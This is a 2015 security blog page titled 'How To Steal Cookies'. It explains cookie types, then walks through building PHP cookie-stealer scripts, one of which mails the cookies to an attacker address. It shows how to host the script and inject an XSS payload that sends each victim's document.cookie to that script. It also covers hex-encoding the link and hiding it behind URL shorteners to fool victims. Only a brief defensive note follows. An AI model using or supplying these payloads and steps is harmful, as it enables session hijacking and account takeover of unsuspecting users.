
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>How To Steal Cookies |     tudouya&#39;s secblog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="tudouya">
    
    <meta name="description" content="Basic Knowledge about CookiesDifferent Types of Cookies:
Session cookieA session cookie upto certain hours,depending on website. After the session hou">
    
    
    
    
    <link rel="alternative" href="/atom.xml" title="    tudouya&#39;s secblog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="stylesheet" href="/css/style.css">
    <link href="//cdn.bootcss.com/highlight.js/9.1.0/styles/railscasts.min.css" rel="stylesheet">
    <style type="text/css">
      figure {
        overflow-x: auto;
      }
    </style>
</head>

  <body>
    <header>
      <div>
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="    tudouya&#39;s secblog">    tudouya&#39;s secblog</a></h1>
				<h2 class="blog-motto">~The quieter you become,the more you can hear~</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/sitemap.xml">sitemap</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li><form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:sec.php101.cn">
					</form></li>
				</ul>
			</nav>
</div>
    </header>
    <div id="wrap">
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
    <time datetime="2015-11-09T15:17:19.000Z" itemprop="datePublished">
      <a href="/2015/11/09/How-To-Steal-Cookies/" title="How To Steal Cookies" itemprop="url" class="article-time">2015-11-09</a>
    </time>

  <h1 itemprop="name" class="article-name">
    
      <a href="/2015/11/09/How-To-Steal-Cookies/" title="How To Steal Cookies" itemprop="url"><span>How To Steal Cookies</span></a>
  </h1>
</header>

	<div class="article-content">
		
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Knowledge-about-Cookies"><span class="toc-number">1.</span> <span class="toc-text">Basic Knowledge about Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-cookie"><span class="toc-number">1.1.</span> <span class="toc-text">Session cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Persistent-Cookie"><span class="toc-number">1.2.</span> <span class="toc-text">Persistent Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-cookie"><span class="toc-number">1.3.</span> <span class="toc-text">Secure cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpOnly-cookie"><span class="toc-number">1.4.</span> <span class="toc-text">HttpOnly cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-party-cookie"><span class="toc-number">1.5.</span> <span class="toc-text">Third-party cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Supercookie"><span class="toc-number">1.6.</span> <span class="toc-text">Supercookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zombie-cookie"><span class="toc-number">1.7.</span> <span class="toc-text">Zombie cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-the-use-of-Cookies"><span class="toc-number">2.</span> <span class="toc-text">What is the use of Cookies?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-management"><span class="toc-number">2.1.</span> <span class="toc-text">Session management</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Personalization"><span class="toc-number">2.2.</span> <span class="toc-text">Personalization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tracking"><span class="toc-number">2.3.</span> <span class="toc-text">Tracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-create-cookie-stealer-Coding-in-PHP"><span class="toc-number">3.</span> <span class="toc-text">How to create cookie stealer Coding in PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Stealing"><span class="toc-number">4.</span> <span class="toc-text">Cookie Stealing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Creating-Cookie-Stealer-PHP-file"><span class="toc-number">4.1.</span> <span class="toc-text">Step 1: Creating Cookie Stealer PHP file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2"><span class="toc-number">4.2.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Exploiting-the-XSS-Vulnerability"><span class="toc-number">4.3.</span> <span class="toc-text">Step 3:Exploiting the XSS Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-Stealing-with-Non-Persistent-vs-Persistent-XSS"><span class="toc-number">4.4.</span> <span class="toc-text">Cookie Stealing with Non-Persistent vs Persistent XSS:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-Secure-from-this-attack"><span class="toc-number">5.</span> <span class="toc-text">How to Secure from this attack?</span></a></li></ol>
		
		</div>
		
		<h2 id="Basic-Knowledge-about-Cookies"><a href="#Basic-Knowledge-about-Cookies" class="headerlink" title="Basic Knowledge about Cookies"></a>Basic Knowledge about Cookies</h2><p>Different Types of Cookies:</p>
<h3 id="Session-cookie"><a href="#Session-cookie" class="headerlink" title="Session cookie"></a>Session cookie</h3><p>A session cookie upto certain hours,depending on website. After the session hour, it will be destroyed.<br><br></p>
<h3 id="Persistent-Cookie"><a href="#Persistent-Cookie" class="headerlink" title="Persistent Cookie"></a>Persistent Cookie</h3><p>A persistent cookie will outlast user sessions. If a persistent cookie has its Max-Age set to 1 year, then, within the year, the initial value set in that cookie would be sent back to the server every time the user visited the server. This could be used to record a vital piece of information such as how the user initially came to this website. For this reason, persistent cookies are also called <strong>tracking</strong> cookies or <strong>in-memory</strong> cookies.<br><br></p>
<h3 id="Secure-cookie"><a href="#Secure-cookie" class="headerlink" title="Secure cookie"></a>Secure cookie</h3><p>Secure cookies are encrypted cookies. If you used HTTPS(secure Connection), then it will store the cookies in encrypted format. Even hackers steal the cookie, he is able to see only the encrypted data.<br><br></p>
<h3 id="HttpOnly-cookie"><a href="#HttpOnly-cookie" class="headerlink" title="HttpOnly cookie"></a>HttpOnly cookie</h3><p>The HttpOnly cookie is supported by most modern browsers. On a supported browser, an HttpOnly session cookie will be used only when transmitting HTTP (or HTTPS) requests, thus restricting access from other, non-HTTP APIs (such as JavaScript). <strong>This restriction mitigates but does not eliminate the threat of session cookie theft via Cross-site scripting.</strong> It is important to realize this feature applies only to session-management cookies, and not other browser cookies.<br><br></p>
<h3 id="Third-party-cookie"><a href="#Third-party-cookie" class="headerlink" title="Third-party cookie"></a>Third-party cookie</h3><p>Third-party cookies will store the cookies with another domain.  </p>
<p>For Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com will store the cookies with ad.advertise12.com</span><br></pre></td></tr></table></figure></p>
<p>At the same time, another website also set cookies with same domain.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.othersite.com will store the cookies with ad.advertise12.com</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="Supercookie"><a href="#Supercookie" class="headerlink" title="Supercookie"></a>Supercookie</h3><p>A “supercookie” is a cookie with a public suffix domain, like .com, .co.in,.in.<br>Most browsers, by default, allow first-party cookies—a cookie with domain to be the same or sub-domain of the requesting host. For example, a user visiting <a href="http://www.example.com" target="_blank" rel="external">http://www.example.com</a> can have a cookie set with domain <a href="http://www.example.com" target="_blank" rel="external">http://www.example.com</a> or .example.com, but not .com. A supercookie with domain .com would be blocked by browsers; otherwise, a malicious website, like attacker.com, could set a supercookie with domain .com and potentially disrupt or impersonate legitimate user requests to example.com.<br><br></p>
<h3 id="Zombie-cookie"><a href="#Zombie-cookie" class="headerlink" title="Zombie cookie"></a>Zombie cookie</h3><p>A zombie cookie is any cookie that is automatically recreated after a user has deleted it. This is accomplished by a script storing the content of the cookie in some other locations, such as the local storage available to Flash content, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie’s absence is detected.  </p>
<h2 id="What-is-the-use-of-Cookies"><a href="#What-is-the-use-of-Cookies" class="headerlink" title="What is the use of Cookies?"></a>What is the use of Cookies?</h2><h3 id="Session-management"><a href="#Session-management" class="headerlink" title="Session management"></a>Session management</h3><p>Cookies may be used to maintain data related to the user during navigation, possibly across multiple visits. Cookies were introduced to provide a way to implement a “shopping cart” (or “shopping basket”), a virtual device into which users can store items they want to purchase as they navigate throughout the site.<br><br></p>
<h3 id="Personalization"><a href="#Personalization" class="headerlink" title="Personalization"></a>Personalization</h3><p>Cookies may be used to remember the information about the user who has visited a website in order to show relevant content in the future. For example a web server may send a cookie containing the username last used to log in to a web site so that it may be filled in for future visits.<br><br></p>
<h3 id="Tracking"><a href="#Tracking" class="headerlink" title="Tracking"></a>Tracking</h3><p>Tracking cookies may be used to track internet users’ web browsing habits. This can also be done in part by using the IP address of the computer requesting the page or the referrer field of the HTTP request header, but cookies allow for greater precision</p>
<h2 id="How-to-create-cookie-stealer-Coding-in-PHP"><a href="#How-to-create-cookie-stealer-Coding-in-PHP" class="headerlink" title="How to create cookie stealer Coding in PHP"></a>How to create cookie stealer Coding in PHP</h2><p>Here is the simple Cookie Stealer code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $HTTP_GET_VARS[&quot;cookie&quot;];</span><br><span class="line">$steal = fopen(&quot;cookiefile.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($steal, $cookie .&quot;\\n&quot;);</span><br><span class="line">fclose($steal);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>Another version: Sends cookies to the hacker mail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $HTTP_GET_VARS[&quot;cookie&quot;]; mail(&quot;hackerid@mailprovider.com&quot;, &quot;Stolen Cookies&quot;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>Third Version<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;))</span><br><span class="line">  $ip = getenv(&quot;HTTP_CLIENT_IP&quot;);</span><br><span class="line">    else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;))</span><br><span class="line">  $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);</span><br><span class="line">    else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;))</span><br><span class="line">  $ip = getenv(&quot;REMOTE_ADDR&quot;);</span><br><span class="line">    else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;))</span><br><span class="line">  $ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br></pre></td></tr></table></figure></p>
<h2 id="Cookie-Stealing"><a href="#Cookie-Stealing" class="headerlink" title="Cookie Stealing"></a>Cookie Stealing</h2><p>Cookie stealing is the process of exploiting the XSS vulnerability (Non-persistent/persistent) and steal the cookie from the victim who visit the infected link. These cookie will be used to compromise their accounts.</p>
<h3 id="Step-1-Creating-Cookie-Stealer-PHP-file"><a href="#Step-1-Creating-Cookie-Stealer-PHP-file" class="headerlink" title="Step 1: Creating Cookie Stealer PHP file"></a>Step 1: Creating Cookie Stealer PHP file</h3><p>I have explained three versions of cookie stealer. We are going to use the third version.<br>Copy the code.<br>Open Notepad and paste the code<br>Save the file with .php extension<br>Eg: Stealer.php  </p>
<p>Now create New file and save it as log.txt (leave it as blank). Don’t change the name , this is the file name what we give in php file.</p>
<p>Now you will have two files;</p>
<ul>
<li><ol>
<li>Stealer.php</li>
</ol>
</li>
<li><ol>
<li>log.txt</li>
</ol>
</li>
</ul>
<p>What these two files do exactly?</p>
<ul>
<li>The above Stealer.php file get ip address,cookie and stores the data in log.txt file.</li>
<li>The log.txt has cookies , ip address details.<br><br></li>
</ul>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>Register in a free web-hosting service and login into your cpanel.<br>Now open the File Manager in cpanel.<br>Upload the Stealer.php and log.txt to root folder or public_html folder.  </p>
<p>Now the stealer will be at hxxp://www.YourSite.com/Stealer.php .<br><br></p>
<h3 id="Step-3-Exploiting-the-XSS-Vulnerability"><a href="#Step-3-Exploiting-the-XSS-Vulnerability" class="headerlink" title="Step 3:Exploiting the XSS Vulnerability"></a>Step 3:Exploiting the XSS Vulnerability</h3><p>So Far , we have sharpened our saw. Now we are going to use it.<br>Once you set up everything and find a Vulnerable site,then inject the following code in the Vulnerable sites.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="Cookie-Stealing-with-Non-Persistent-vs-Persistent-XSS"><a href="#Cookie-Stealing-with-Non-Persistent-vs-Persistent-XSS" class="headerlink" title="Cookie Stealing with Non-Persistent vs Persistent XSS:"></a>Cookie Stealing with Non-Persistent vs Persistent XSS:</h3><p><strong>Persistent:</strong> if you inject this code in Persistent XSS vulnerable site, it will be there forever until admin find it. It will be shown to all users. So attackers don’t need to send any link to others. Whoever visit the page, they will be vicim.  </p>
<p><strong>Non-Persistent:</strong> In case of Non-persistent attack, attacker will send the link to victims. Whenever they follow the link, it will steal the cookie. Most of sites are vulnerable to Non-persistent XSS .</p>
<p>In Non-persistence, Attackers will send the injected link victims.<br>For example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxxp://www.VulnerableSite.com/index.php?search=&lt;script&gt;location.href = &apos;http://www.Yoursite.com/Stealer.php?cookie=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>The above link is clearly shows the scripts. Hackers can Hex-encode this script so that victim can’t see the script.<br>For Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxp://www.VulnerableSite.com/index.php?search=%3c%73%63%72%69%70%74%3e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66​​%20%3d%20%27%68%74%74%70%3a%2f%2f%77%77%77%2e%59%6f%75%72%73%69%74%65%2e%63%6f%​6​d%2f%53%74%65%61%6c%65%72%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%7​5%​6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure></p>
<p>Still , the link look long. The attacker use one more trick to hide the long url i.e url shortening sites. There are lot of sites that shorten the long url into tiny url.</p>
<h2 id="How-to-Secure-from-this-attack"><a href="#How-to-Secure-from-this-attack" class="headerlink" title="How to Secure from this attack?"></a>How to Secure from this attack?</h2><p>Use No-Script Addon. This is best protection to stay away from XSS  </p>
<p>Never Click the Shorten url  </p>
<p>Sometime you may want to follow the shorten link. If so, then clear all cookies in your browser and visit through Proxy or VPN(it will hide your ip)<br><br></p>
  
	</div>
		<footer class="article-footer clearfix">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/B-XSS/">B-XSS</a>
</div>





<div class="article-share" id="share">

  <div data-url="http://sec.php101.cn/2015/11/09/How-To-Steal-Cookies/" data-title="How To Steal Cookies |     tudouya&#39;s secblog" data-tsina="undefined" class="share clearfix">
  </div>

</div>
</footer>   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2015/11/13/The-Main-Points-of-Penetration-Testing-Methodology/" title="The Main Points of Penetration Testing Methodology">
  <strong>上一篇：</strong><br/>
  <span>
  The Main Points of Penetration Testing Methodology</span>
</a>
</div>


<div class="next">
<a href="/2015/11/06/Enable-SSH-ON-Kali/"  title="Enable SSH ON Kali">
 <strong>下一篇：</strong><br/> 
 <span>Enable SSH ON Kali
</span>
</a>
</div>

</nav>

	
<section class="comment">
	<div class="ds-thread"></div>
</section>

</div>  
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">文章目录</strong>
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Knowledge-about-Cookies"><span class="toc-number">1.</span> <span class="toc-text">Basic Knowledge about Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-cookie"><span class="toc-number">1.1.</span> <span class="toc-text">Session cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Persistent-Cookie"><span class="toc-number">1.2.</span> <span class="toc-text">Persistent Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-cookie"><span class="toc-number">1.3.</span> <span class="toc-text">Secure cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpOnly-cookie"><span class="toc-number">1.4.</span> <span class="toc-text">HttpOnly cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-party-cookie"><span class="toc-number">1.5.</span> <span class="toc-text">Third-party cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Supercookie"><span class="toc-number">1.6.</span> <span class="toc-text">Supercookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zombie-cookie"><span class="toc-number">1.7.</span> <span class="toc-text">Zombie cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-the-use-of-Cookies"><span class="toc-number">2.</span> <span class="toc-text">What is the use of Cookies?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Session-management"><span class="toc-number">2.1.</span> <span class="toc-text">Session management</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Personalization"><span class="toc-number">2.2.</span> <span class="toc-text">Personalization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tracking"><span class="toc-number">2.3.</span> <span class="toc-text">Tracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-create-cookie-stealer-Coding-in-PHP"><span class="toc-number">3.</span> <span class="toc-text">How to create cookie stealer Coding in PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Stealing"><span class="toc-number">4.</span> <span class="toc-text">Cookie Stealing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1-Creating-Cookie-Stealer-PHP-file"><span class="toc-number">4.1.</span> <span class="toc-text">Step 1: Creating Cookie Stealer PHP file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2"><span class="toc-number">4.2.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-Exploiting-the-XSS-Vulnerability"><span class="toc-number">4.3.</span> <span class="toc-text">Step 3:Exploiting the XSS Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-Stealing-with-Non-Persistent-vs-Persistent-XSS"><span class="toc-number">4.4.</span> <span class="toc-text">Cookie Stealing with Non-Persistent vs Persistent XSS:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-Secure-from-this-attack"><span class="toc-number">5.</span> <span class="toc-text">How to Secure from this attack?</span></a></li></ol>
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
			<li><a href="/categories/A-SQLi/" title="A-SQLi">A-SQLi<sup>7</sup></a></li>
		
			<li><a href="/categories/B-XSS/" title="B-XSS">B-XSS<sup>2</sup></a></li>
		
			<li><a href="/categories/H-AttackFlow/" title="H-AttackFlow">H-AttackFlow<sup>1</sup></a></li>
		
			<li><a href="/categories/T-Tools/" title="T-Tools">T-Tools<sup>1</sup></a></li>
		
			<li><a href="/categories/Z-Other/" title="Z-Other">Z-Other<sup>1</sup></a></li>
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			<li><a href="/tags/Blind/" title="Blind">Blind<sup>2</sup></a></li>
		
			<li><a href="/tags/Boolean-Based/" title="Boolean Based">Boolean Based<sup>2</sup></a></li>
		
			<li><a href="/tags/Dork/" title="Dork">Dork<sup>1</sup></a></li>
		
			<li><a href="/tags/Double-Query/" title="Double Query">Double Query<sup>1</sup></a></li>
		
			<li><a href="/tags/Error-Based/" title="Error Based">Error Based<sup>1</sup></a></li>
		
			<li><a href="/tags/MegaSQLi/" title="MegaSQLi">MegaSQLi<sup>4</sup></a></li>
		
			<li><a href="/tags/String-Based/" title="String Based">String Based<sup>1</sup></a></li>
		
			<li><a href="/tags/crypt/" title="crypt">crypt<sup>1</sup></a></li>
		
			<li><a href="/tags/hash/" title="hash">hash<sup>1</sup></a></li>
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
</div>


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

</aside>
<div>
<br />
</div>

    </div>
</div>
    <footer><div id="footer" >
	
    <div class="social-font" class="clearfix">
        
        <a href="http://weibo.com/5050395856" target="_blank" class="icon-weibo" title="weibo"></a>
        
        
        <a href="https://github.com/tudouya" target="_blank" class="icon-github" title="github"></a>
        
        
        
        
        
        
        <a href="mailto:568865013@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
        
    </div>
	<section class="info">
		<p class="l1">
            keep foolish~keep hungry
        </p>
            <!-- <br/> -->
        <p class="l2">
			～如果我们不选择堕落，那么地狱的存在还有什么意义～
        </p>
	</section>
	 
		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/RagingCat/hexo-theme-ragingcat" target="_blank" title="hexo-theme-ragingcat">Raging Cat</a> © 2016
		
		<a href="http://sec.php101.cn/about" target="_blank" title="tudouya">tudouya</a>
		
		</p>
</div></footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
$(document).ready(function(){
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  $(window).resize(function(){
    getSize();
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else
    {
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
      
    }
  });
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      h  = $('article h2')
      ah = $('article h2'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  if(ah.length==0){
    t.css('display','none');
  }else{
    c.click(function(){
      ta.css('display', 'block').addClass('fadeIn');
    });
    o.click(function(){
      ta.css('display', 'none');
    });
    $(window).scroll(function(){
      ta.css("top",Math.max(140,320-$(this).scrollTop()));
    });
  };
});
</script>


<script type="text/javascript">
$(document).ready(function(){
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina');
  var html = [
  '<a href="#" class="overlay" id="qrcode"></a>',
  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);
  $('.article-share-qrcode').click(function(){
    var imgSrc = $('#qrcode-pic').attr('data-src');
    $('#qrcode-pic').attr('src', imgSrc);
    $('#qrcode-pic').load(function(){
        $('.qrcode strong').text(' ');
    });
  });
});
</script>


<script type="text/javascript">
  var duoshuoQuery = {short_name:"ragingcat"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
</script>



<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<style type="text/css">
</style>
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script><script type="text/javascript">
$(document).ready(function(){
    $('pre').each(function(i, block) {
      hljs.highlightBlock(block);
    });
    $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
});
</script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-60243036-1', 'auto');
  ga('send', 'pageview');

</script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript"
   src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
  </body>
</html>
